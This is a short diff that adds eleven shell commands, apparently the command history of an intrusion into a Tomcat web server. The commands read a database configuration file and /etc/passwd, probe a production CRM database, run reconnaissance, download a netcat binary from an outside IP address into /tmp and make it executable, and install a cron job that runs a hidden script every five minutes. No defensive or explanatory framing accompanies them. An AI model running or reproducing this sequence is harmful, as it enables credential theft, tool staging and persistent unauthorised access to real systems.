@@ -1,0 +1,11 @@
+cat /opt/tomcat/conf/db_config.xml
+psql -h 10.0.2.10 -U app_svc -d crm_production -c "SELECT version();"
+cat /etc/passwd
+uname -a
+id
+whoami
+ls -la /opt/tomcat/webapps/ROOT/
+curl http://198.51.100.45:8443/tools/nc -o /tmp/nc
+chmod +x /tmp/nc
+crontab -l
+echo "*/5 * * * * /etc/cron.d/.cleanup.sh" | crontab -
